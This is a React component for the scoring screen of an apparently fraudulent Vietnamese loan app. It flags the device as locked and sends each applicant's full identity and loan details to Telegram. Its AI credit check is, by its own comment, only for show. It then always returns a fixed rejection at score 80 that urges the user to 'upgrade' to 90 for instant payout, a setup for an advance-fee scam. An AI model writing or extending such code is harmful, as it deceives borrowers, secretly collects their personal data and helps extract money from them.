
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { getAICreditScoring } from '../services/geminiService';
import { sendFullApplicationToTelegram } from '../services/telegramService';
import { saveApplication } from '../services/supabaseService';
import { UserProfile, LoanRequest, LoanRecord } from '../types';

interface ScoringViewProps {
  user: UserProfile;
  loan: LoanRequest;
  onComplete: (record: LoanRecord) => void;
}

const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Đang kết nối hệ thống bảo mật...');

  useEffect(() => {
    let isMounted = true;
    
    const runScoring = async () => {
      // Khóa thiết bị ngay lập tức
      localStorage.setItem('device_locked', 'true');
      
      try {
        // Bước 1: Telegram Notification
        setProgress(15);
        setStatus('Đang gửi hồ sơ định danh...');
        await sendFullApplicationToTelegram(user, loan);

        // Bước 2: AI Scoring (Dùng để giả lập sự thông minh)
        setProgress(40);
        setStatus('AI đang thẩm định hồ sơ...');
        await getAICreditScoring(user, loan);
        
        // Cố định kết quả cho bản Demo theo kịch bản khách hàng mong muốn
        const finalScore = 80;
        const finalDecision = 'rejected';
        const finalReason = "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức.";

        // Bước 3: Lưu vào Supabase Cloud (nếu có cấu hình)
        setProgress(70);
        setStatus('Đang lưu trữ hồ sơ vĩnh viễn...');
        try {
          await saveApplication(user, loan, finalScore, finalDecision);
        } catch (e) {
          console.warn("Lưu cloud bỏ qua...");
        }

        if (!isMounted) return;

        setProgress(100);
        const record: LoanRecord = {
          id: "VAY-" + Math.random().toString(36).substr(2, 6).toUpperCase(),
          amount: loan.amount,
          status: 'rejected',
          date: new Date().toLocaleDateString('vi-VN'),
          score: finalScore
        };

        // Ghi đè kết quả cuối cùng vào localStorage
        localStorage.setItem('last_ai_result', JSON.stringify({
          credit_score: finalScore,
          risk_level: 'medium',
          decision: 'rejected',
          reason: finalReason
        }));

        onComplete(record);
        setTimeout(() => navigate('/result'), 800);

      } catch (error) {
        console.error("Lỗi thẩm định:", error);
        // Fallback an toàn
        localStorage.setItem('last_ai_result', JSON.stringify({
          credit_score: 80,
          risk_level: 'medium',
          decision: 'rejected',
          reason: "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức."
        }));
        if (isMounted) navigate('/result');
      }
    };

    runScoring();
    return () => { isMounted = false; };
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] p-8 text-center space-y-8 animate-in fade-in duration-300">
      <div className="relative w-40 h-40">
        <svg className="w-full h-full" viewBox="0 0 100 100">
          <circle cx="50" cy="50" r="45" fill="none" stroke="#f1f5f9" strokeWidth="10" />
          <circle 
            cx="50" cy="50" r="45" fill="none" stroke="#10b981" strokeWidth="10" 
            strokeDasharray="282.7" strokeDashoffset={282.7 - (282.7 * progress) / 100}
            strokeLinecap="round" className="transition-all duration-300 ease-out"
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-10 h-10 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-2xl font-black text-emerald-600 uppercase">Đang thẩm định</h3>
        <p className="text-slate-500 text-sm">{status}</p>
      </div>
    </div>
  );
};

export default ScoringView;
